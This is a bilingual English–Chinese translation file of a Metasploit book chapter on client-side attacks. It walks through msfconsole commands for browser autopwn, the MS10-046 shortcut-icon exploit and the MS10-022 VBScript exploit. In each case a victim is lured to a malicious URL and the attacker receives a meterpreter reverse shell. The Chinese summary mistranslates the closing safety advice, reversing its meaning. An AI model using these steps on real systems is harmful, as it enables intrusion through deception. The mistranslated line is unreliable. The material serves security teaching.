- en: Chapter 6. Client-side Exploitation
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第6章。客户端利用
- en: In the previous chapter we completed the vulnerability-scanning and information-gathering
    phase. In this chapter we will discuss various ways in which we may be able to
    compromise our victim (client). We will cover various techniques such as luring
    a victim to click on a URL or an icon, which ultimately gives us a reverse shell.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 在上一章中，我们完成了漏洞扫描和信息收集阶段。在本章中，我们将讨论各种可能危害我们受害者（客户端）的方式。我们将涵盖各种技术，如诱使受害者点击URL或图标，最终为我们提供反向shell。
- en: What are client-side attacks?
  id: totrans-2
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 什么是客户端攻击？
- en: With our hands all dirty with some exploitation basics in the previous chapters,
    we now move on to client-side attacks. But to understand client-side attacks,
    we need to first have clear concepts about the client-server architecture, and
    differentiate the attacks between the two components. The server is the main computer
    that shares its resources over the network, and clients—which are other computers
    on the network—use these resources. There is always a negative aspect to every
    story. So, as the server provides services to a client, it may also expose vulnerabilities
    that may be exploited. Now, when an attacker attacks a server, he may be able
    to do a denial-of-service attack on the server, which will ultimately crash all
    its services. This, specifically talking, is a server-side attack, because we
    have actually tried to attack the server and not any of the clients.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在前几章中，我们的手已经被一些基本的利用弄得很脏，现在我们转向客户端攻击。但是要理解客户端攻击，我们首先需要对客户端-服务器架构有清晰的概念，并区分两个组件之间的攻击。服务器是共享其网络资源的主要计算机，客户端（即网络上的其他计算机）使用这些资源。每个故事都有负面方面。因此，由于服务器向客户端提供服务，它可能也会暴露可被利用的漏洞。现在，当攻击者攻击服务器时，他可能会对服务器进行拒绝服务攻击，最终导致所有服务崩溃。具体来说，这是一种服务器端攻击，因为我们实际上试图攻击服务器而不是任何客户端。
- en: A client-side attack is restricted to a client and targets vulnerable services
    and programs that may be running on that particular machine. These days, the trend
    is changing and is more focused on client-side rather than server-side attacks.
    According to a general trend, the server is usually locked down with minimal services
    and restricted access. This makes it very difficult to attack servers and hence
    the black hats get enticed towards the vulnerable clients. There is a large array
    of attacks that may be launched against the clients, such as browser-based attacks
    and vulnerable service exploitation. Also, the client operating systems have multiple
    applications such as a PDF Reader, document reader, and instant messenger. These
    are often not updated or patched for security vulnerabilities, since they are
    left ignored as a security misconfiguration. Hence, it is extremely easy to launch
    an exploit against such vulnerable systems using simple social engineering techniques.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端攻击仅限于客户端，并针对可能在该特定计算机上运行的易受攻击的服务和程序。如今，趋势正在改变，更加关注客户端而不是服务器端攻击。根据一般趋势，服务器通常被锁定，只提供最少的服务和受限的访问。这使得攻击服务器变得非常困难，因此黑客们更倾向于易受攻击的客户端。可以对客户端发起大量攻击，如基于浏览器的攻击和易受攻击的服务利用。此外，客户端操作系统有多个应用程序，如PDF阅读器、文档阅读器和即时通讯工具。由于它们被忽略为安全配置错误，通常不会更新或修补安全漏洞。因此，使用简单的社会工程技术对这些易受攻击的系统发起利用非常容易。
- en: Browser exploits
  id: totrans-5
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 浏览器漏洞
- en: Browser vulnerabilities have been known for a very long time. The framework
    and extensions are also at times the reason for exploitation. We have had recent
    news of the compromise of some of the latest versions of browsers such as Chromium,
    Internet Explorer, and Mozilla. The malicious code may exploit any form of ActiveX,
    Java, and Flash, which are in-built in the browser to enhance the user experience.
    Victims who have been affected by such exploits may find their homepage, search
    page, favorites, and bookmarks changed. There may be incidents where the settings
    or Internet options could be altered to decrease the level of browser security,
    and hence make the malwares more prevalent.
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 浏览器漏洞已经被人们知晓很长时间了。框架和扩展有时也是被利用的原因。我们最近听说了一些最新版本的浏览器，如Chromium、Internet Explorer和Mozilla被攻破的消息。恶意代码可能利用浏览器内置的任何形式的ActiveX、Java和Flash来增强用户体验。受到此类攻击影响的受害者可能会发现其主页、搜索页面、收藏夹和书签被更改。可能会发生设置或Internet选项被更改以降低浏览器安全级别的情况，从而使恶意软件更加普遍。
- en: Tutorial
  id: totrans-7
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 教程
- en: In the tutorial section, we will show you a couple of exploits that run through
    the victim browser.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 在教程部分，我们将向您展示一些通过受害者浏览器运行的漏洞利用。
- en: The first exploit that we will be showing is known as browser autopwn. First
    open up your terminal and launch `msfconsole`. Now type in `use auxiliary/server/browser
    autopwn`.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将展示的第一个利用被称为浏览器autopwn。首先打开终端并启动`msfconsole`。现在输入`use auxiliary/server/browser
    autopwn`。
- en: '![Tutorial](img/3589_06_01.jpg)'
  id: totrans-10
  prefs: []
  type: TYPE_IMG
  zh: '![教程](img/3589_06_01.jpg)'
- en: Then type in `show options` to see in detail all the options that we have to
    set in the exploit.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 然后输入`show options`以详细查看我们必须在利用中设置的所有选项。
- en: '![Tutorial](img/3589_06_02.jpg)'
  id: totrans-12
  prefs: []
  type: TYPE_IMG
  zh: '![教程](img/3589_06_02.jpg)'
- en: In the preceding figure, we can see which options are required and which are
    not in the **Required** column. A **yes** indicates that we have to set the option
    and **no** indicates that the option can be used with its default setting. So
    the first option required is `LHOST`. It requires the IP address for the reverse
    connection, so here we set the attacker's machine IP. To do so, type in `set LHOST
    192.168.11.23`.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的图中，我们可以看到**必需**列中哪些选项是必需的，哪些是不必需的。 **是**表示我们必须设置该选项，**否**表示该选项可以使用其默认设置。因此，第一个必需的选项是`LHOST`。它需要反向连接的IP地址，因此在这里我们设置攻击者的机器IP。要这样做，请输入`set
    LHOST 192.168.11.23`。
- en: '![Tutorial](img/3589_06_03.jpg)'
  id: totrans-14
  prefs: []
  type: TYPE_IMG
  zh: '![教程](img/3589_06_03.jpg)'
- en: After setting the `LHOST` address, the next thing to set is `SRVHOST`. `SRVHOST`
    means the server localhost address. We set our local machine address by typing
    in `set SRVHOST 192.168.11.23`.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 设置`LHOST`地址后，下一个要设置的是`SRVHOST`。`SRVHOST`表示服务器本地主机地址。我们通过输入`set SRVHOST 192.168.11.23`来设置我们的本地机器地址。
- en: '![Tutorial](img/3589_06_04.jpg)'
  id: totrans-16
  prefs: []
  type: TYPE_IMG
  zh: '![教程](img/3589_06_04.jpg)'
- en: Now, to set the `SRVPORT`, which means the local port address, we type in `set
    SRVPORT 80`.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，要设置`SRVPORT`，也就是本地端口地址，我们输入`set SRVPORT 80`。
- en: '![Tutorial](img/3589_06_05.jpg)'
  id: totrans-18
  prefs: []
  type: TYPE_IMG
  zh: '![教程](img/3589_06_05.jpg)'
- en: All the settings are done. Now it's time to run the auxiliary module; so type
    in `run`.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 所有设置都完成了。现在是运行辅助模块的时候了；输入`run`。
- en: '![Tutorial](img/3589_06_06.jpg)'
  id: totrans-20
  prefs: []
  type: TYPE_IMG
  zh: '![教程](img/3589_06_06.jpg)'
- en: After running the auxiliary module, we can see that it starts the exploit modules
    on the localhost. Also, it provides a malicious URL, which we have to give to
    the victim. This is a simple social engineering technique in which the user is
    lured to click on the malicious URL.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 运行辅助模块后，我们可以看到它在本地主机上启动了利用模块。此外，它提供了一个恶意URL，我们必须提供给受害者。这是一种简单的社会工程技术，用户被诱使点击恶意URL。
- en: '![Tutorial](img/3589_06_07.jpg)'
  id: totrans-22
  prefs: []
  type: TYPE_IMG
  zh: '![教程](img/3589_06_07.jpg)'
- en: Now, when the URL opens in the victim's system, it will send a reverse connection
    to the attacker's system. Let us see how this works.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，当URL在受害者的系统中打开时，它将向攻击者的系统发送一个反向连接。让我们看看这是如何工作的。
- en: '![Tutorial](img/3589_06_08.jpg)'
  id: totrans-24
  prefs: []
  type: TYPE_IMG
  zh: '![教程](img/3589_06_08.jpg)'
- en: After running the URL, we can see in `msfconsole` that the reverse connection
    has been established, and the `notepad.exe` process migrates to 1804.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 运行URL后，我们可以在`msfconsole`中看到已建立反向连接，并且`notepad.exe`进程迁移到了1804。
- en: '![Tutorial](img/3589_06_09.jpg)'
  id: totrans-26
  prefs: []
  type: TYPE_IMG
  zh: '![教程](img/3589_06_09.jpg)'
- en: We can see the migrated process in the victim's system via Task Manager.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以通过任务管理器在受害者的系统中看到迁移的进程。
- en: '![Tutorial](img/3589_06_10.jpg)'
  id: totrans-28
  prefs: []
  type: TYPE_IMG
  zh: '![教程](img/3589_06_10.jpg)'
- en: To check for the `meterpreter` session that was created, type in `sessions`.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 要检查已创建的`meterpreter`会话，输入`sessions`。
- en: '![Tutorial](img/3589_06_11.jpg)'
  id: totrans-30
  prefs: []
  type: TYPE_IMG
  zh: '![教程](img/3589_06_11.jpg)'
- en: Now select the `meterpreter` session for exploiting the victim's system. For
    selecting the session, the command to be used is `sessions –i <Id>`; for example,
    here we are using `sessions –i 1`.
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 现在选择`meterpreter`会话以利用受害者的系统。要选择会话，要使用的命令是`sessions –i <Id>`；例如，在这里我们使用`sessions
    –i 1`。
- en: '![Tutorial](img/3589_06_12.jpg)'
  id: totrans-32
  prefs: []
  type: TYPE_IMG
  zh: '![教程](img/3589_06_12.jpg)'
- en: After selecting a session, we instantly get the `meterpreter` session. We can
    then go for further exploits. For example, in the preceding figure, we can see
    the `sysinfo` command used for checking the system information.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 选择一个会话后，我们立即获得了`meterpreter`会话。然后我们可以进行进一步的利用。例如，在前面的图中，我们可以看到用于检查系统信息的`sysinfo`命令。
- en: Internet Explorer shortcut icon exploit
  id: totrans-34
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Internet Explorer快捷方式图标利用漏洞
- en: Another browser exploit we are going to demonstrate is of shortcut icons that
    contain a malicious DLL. This exploit is a social engineering attack that runs
    on IE 6 under Windows XP. We just need to lure our victim to click on the link
    to run the exploit on his system. Launch `msfconsole` and type in `use windows/browser/ms10_046_shortcut_icon_dllloader`.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将演示的另一个浏览器利用漏洞是包含恶意DLL的快捷方式图标。这个利用漏洞是在Windows XP下的IE 6上运行的社会工程攻击。我们只需要诱使我们的受害者点击链接来在他的系统上运行利用漏洞。启动`msfconsole`并输入`use
    windows/browser/ms10_046_shortcut_icon_dllloader`。
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_13.jpg)'
  id: totrans-36
  prefs: []
  type: TYPE_IMG
  zh: '![Internet Explorer快捷方式图标利用漏洞](img/3589_06_13.jpg)'
- en: Now type in `show options` to see in detail all the options that we have to
    set in the exploit.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 现在输入`show options`以查看详细的所有选项，我们需要设置利用漏洞。
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_14.jpg)'
  id: totrans-38
  prefs: []
  type: TYPE_IMG
  zh: '![Internet Explorer快捷方式图标利用漏洞](img/3589_06_14.jpg)'
- en: The first option required is `SRVHOST`. It requires the IP address for the reverse
    connection, so here we set the attacker's machine IP by typing in `set SRVHOST
    192.168.0.109`.
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 所需的第一个选项是`SRVHOST`。它需要反向连接的IP地址，所以我们通过输入`set SRVHOST 192.168.0.109`来设置攻击者的机器IP。
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_15.jpg)'
  id: totrans-40
  prefs: []
  type: TYPE_IMG
  zh: '![Internet Explorer快捷方式图标利用漏洞](img/3589_06_15.jpg)'
- en: Now set the `SRVPORT` address, which means the local port address, by typing
    in `set SRVPORT 80`.
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 现在设置`SRVPORT`地址，也就是本地端口地址，输入`set SRVPORT 80`。
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_16.jpg)'
  id: totrans-42
  prefs: []
  type: TYPE_IMG
  zh: '![Internet Explorer快捷方式图标利用漏洞](img/3589_06_16.jpg)'
- en: The next option is to set the `URIPATH` path to the default setting by typing
    in `set URIPATH /`.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 下一个选项是通过输入`set URIPATH /`将`URIPATH`路径设置为默认设置。
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_17.jpg)'
  id: totrans-44
  prefs: []
  type: TYPE_IMG
  zh: '![Internet Explorer快捷方式图标利用漏洞](img/3589_06_17.jpg)'
- en: Now all options are set and ready to run the exploit. So type in `exploit`.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 现在所有选项都设置好了，准备运行利用漏洞。输入`exploit`。
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_18.jpg)'
  id: totrans-46
  prefs: []
  type: TYPE_IMG
  zh: '![Internet Explorer快捷方式图标利用漏洞](img/3589_06_18.jpg)'
- en: Now it is up to you to do some clever social engineering. Give the URL to the
    victim and just wait for the reverse connection.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 现在轮到你进行一些巧妙的社会工程了。将URL提供给受害者，然后等待反向连接。
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_19.jpg)'
  id: totrans-48
  prefs: []
  type: TYPE_IMG
  zh: '![Internet Explorer快捷方式图标利用漏洞](img/3589_06_19.jpg)'
- en: Opening the URL in the browser will create a shortcut icon and a DLL file. At
    that time, a `meterpreter` session gets created in `msfconsole` and our victim
    has been compromised. Now let us check for sessions by typing in `sessions`.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 在浏览器中打开URL将创建一个快捷方式图标和一个DLL文件。此时，在`msfconsole`中创建了一个`meterpreter`会话，我们的受害者已经受到了威胁。现在让我们通过输入`sessions`来检查会话。
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_20.jpg)'
  id: totrans-50
  prefs: []
  type: TYPE_IMG
  zh: '![Internet Explorer快捷方式图标利用漏洞](img/3589_06_20.jpg)'
- en: We can see here that a session has been created. Now we select the `meterpreter`
    session for exploiting the victim's system. For selecting the session, the command
    to be used is `sessions –i <Id>`; for example, here we are using `sessions –i
    1`.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到已创建了一个会话。现在选择`meterpreter`会话以利用受害者的系统。要选择会话，要使用的命令是`sessions –i <Id>`；例如，在这里我们使用`sessions
    –i 1`。
- en: '![Internet Explorer shortcut icon exploit](img/3589_06_21.jpg)'
  id: totrans-52
  prefs: []
  type: TYPE_IMG
  zh: '![Internet Explorer快捷方式图标利用漏洞](img/3589_06_21.jpg)'
- en: After selecting a session, we successfully receive `meterpreter`; we can then
    go for further exploitation of the client system.
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 选择会话后，我们成功接收`meterpreter`；然后我们可以进一步利用客户端系统。
- en: Internet Explorer malicious VBScript code execution exploit
  id: totrans-54
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 互联网浏览器恶意VBScript代码执行利用
- en: We have another interesting exploit that is similar to our previous exploit
    and uses the same conditions and software versions. This time we are going to
    show you the code execution vulnerability that occurs when a victim presses the
    *F1* button after a message box that is generated by a malicious VBScript on a
    web page appears.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还有另一个有趣的利用，它类似于我们之前的利用，并使用相同的条件和软件版本。这次我们将向您展示当受害者在恶意VBScript在网页上生成的消息框出现后按下*F1*按钮时发生的代码执行漏洞。
- en: For using this exploit, launch `msfconsole` and type in `use exploit/windows/browser/ms10_022_ie_vbscript_winhlp32`.
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: 要使用此利用，启动`msfconsole`并输入`use exploit/windows/browser/ms10_022_ie_vbscript_winhlp32`。
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_22.jpg)'
  id: totrans-57
  prefs: []
  type: TYPE_IMG
  zh: '![互联网浏览器恶意VBScript代码执行利用](img/3589_06_22.jpg)'
- en: Now type in `show options` to see all the options that have to be set in the
    exploit.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 现在输入`show options`以查看在利用中必须设置的所有选项。
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_23.jpg)'
  id: totrans-59
  prefs: []
  type: TYPE_IMG
  zh: '![互联网浏览器恶意VBScript代码执行利用](img/3589_06_23.jpg)'
- en: The first option required is `SRVHOST`. It requires the IP address for the reverse
    connection, so we set the attacker's machine IP. For example, here we type in
    `set SRVHOST 192.168.0.105`.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 第一个所需的选项是`SRVHOST`。它需要反向连接的IP地址，因此我们设置攻击者的机器IP。例如，在这里我们输入`set SRVHOST 192.168.0.105`。
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_24.jpg)'
  id: totrans-61
  prefs: []
  type: TYPE_IMG
  zh: '![互联网浏览器恶意VBScript代码执行利用](img/3589_06_24.jpg)'
- en: Now we set the `SRVPORT` number by typing in `set SRVPORT 80`.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 现在通过输入`set SRVPORT 80`来设置`SRVPORT`号码。
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_25.jpg)'
  id: totrans-63
  prefs: []
  type: TYPE_IMG
  zh: '![互联网浏览器恶意VBScript代码执行利用](img/3589_06_25.jpg)'
- en: The next option is to set the `URIPATH` path to the default setting by typing
    in `set URIPATH /`.
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 下一个选项是将`URIPATH`路径设置为默认设置，输入`set URIPATH /`。
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_26.jpg)'
  id: totrans-65
  prefs: []
  type: TYPE_IMG
  zh: '![互联网浏览器恶意VBScript代码执行利用](img/3589_06_26.jpg)'
- en: Now all the options are set and ready to run the exploit, so type in `exploit`.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 现在所有选项都已设置好，准备运行利用，输入`exploit`。
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_27.jpg)'
  id: totrans-67
  prefs: []
  type: TYPE_IMG
  zh: '![互联网浏览器恶意VBScript代码执行利用](img/3589_06_27.jpg)'
- en: Next, we just need to use some of our social engineering skills to make our
    victim click on the URL. We give the URL to our victim and make him click on it.
    After opening the URL in Internet Explorer, it pops up a message box showing a
    message, **Welcome! Press F1 to dismiss this dialog.**
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们只需要运用一些社会工程技巧，让我们的受害者点击URL。我们把URL给我们的受害者，让他点击它。在Internet Explorer中打开URL后，会弹出一个消息框，显示消息**欢迎！按F1键关闭此对话框。**
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_28.jpg)'
  id: totrans-69
  prefs: []
  type: TYPE_IMG
  zh: '![互联网浏览器恶意VBScript代码执行利用](img/3589_06_28.jpg)'
- en: After *F1* is pressed, the malicious VBScript will run in the browser and send
    a payload named `calc.exe`.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 按下*F1*后，恶意VBScript将在浏览器中运行并发送一个名为`calc.exe`的有效载荷。
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_29.jpg)'
  id: totrans-71
  prefs: []
  type: TYPE_IMG
  zh: '![互联网浏览器恶意VBScript代码执行利用](img/3589_06_29.jpg)'
- en: After executing the `.exe` file, it will make a reverse connection to the attacker
    machine and create a `meterpreter` session. Type in `sessions` for checking the
    available sessions.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 执行`.exe`文件后，它将与攻击者的机器建立一个反向连接并创建一个`meterpreter`会话。输入`sessions`以检查可用的会话。
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_30.jpg)'
  id: totrans-73
  prefs: []
  type: TYPE_IMG
  zh: '![互联网浏览器恶意VBScript代码执行利用](img/3589_06_30.jpg)'
- en: We can see here that a session has been created. Now select the `meterpreter`
    session for exploiting the victim's system. For selecting the session, we use
    the command `sessions –i <Id>`; for example, here we are using `sessions –i 1`.
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到这里已经创建了一个会话。现在选择`meterpreter`会话以利用受害者的系统。为了选择会话，我们使用命令`sessions –i <Id>`；例如，在这里我们使用`sessions
    –i 1`。
- en: '![Internet Explorer malicious VBScript code execution exploit](img/3589_06_31.jpg)'
  id: totrans-75
  prefs: []
  type: TYPE_IMG
  zh: '![互联网浏览器恶意VBScript代码执行利用](img/3589_06_31.jpg)'
- en: After selecting a session, we successfully receive `meterpreter`; we can then
    go for further exploitation of the victim machine.
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 选择会话后，我们成功接收`meterpreter`；然后我们可以进一步利用受害者机器。
- en: Summary
  id: totrans-77
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter we successfully demonstrated some of the niche client-side exploits.
    These exploits were specifically targeted at the client systems through the browser
    or a malicious link, and some social engineering tricks. A golden rule in the
    security book is never to click on unknown links, and in our case we were able
    to get through the defenses of our victim. This is the best part of Metasploit—the
    arrays of attack vectors are so large that if something does not work, another
    will for sure. So it is a recommendation to all to avoid clicking on links, running
    unknown executable files, and responding to e-mails from malicious people. The
    next chapter will deal with some of the techniques on post-exploitation, so stay
    tuned; we still have a lot of exploit tricks to be learned.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们成功演示了一些利用客户端的利基利用。这些利用是专门针对客户端系统通过浏览器或恶意链接以及一些社会工程技巧。安全手册中的一个黄金法则是永远不要点击未知链接，在我们的案例中，我们能够突破受害者的防御。这就是Metasploit的最佳部分——攻击向量的数组如此之大，如果某些方法不起作用，另一个一定会起作用。因此，建议所有人避免点击链接，运行未知的可执行文件，并回复来自恶意人士的电子邮件。下一章将涉及一些关于后期利用的技术，所以请继续关注；我们还有很多利用技巧要学习。
- en: References
  id: totrans-79
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 参考资料
- en: 'The following are some helpful references that shed further light on some of
    the topics covered in this chapter:'
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是一些有用的参考资料，可以进一步阐明本章涉及的一些主题：
- en: '[http://blog.botrevolt.com/what-are-client-side-attacks/](http://blog.botrevolt.com/what-are-client-side-attacks/)'
  id: totrans-81
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://blog.botrevolt.com/what-are-client-side-attacks/](http://blog.botrevolt.com/what-are-client-side-attacks/)'
- en: '[http://en.wikipedia.org/wiki/Browser_exploit](http://en.wikipedia.org/wiki/Browser_exploit)'
  id: totrans-82
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://en.wikipedia.org/wiki/Browser_exploit](http://en.wikipedia.org/wiki/Browser_exploit)'
- en: '[http://www.securitytube.net/video/2697](http://www.securitytube.net/video/2697)'
  id: totrans-83
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '[http://www.securitytube.net/video/2697](http://www.securitytube.net/video/2697)'
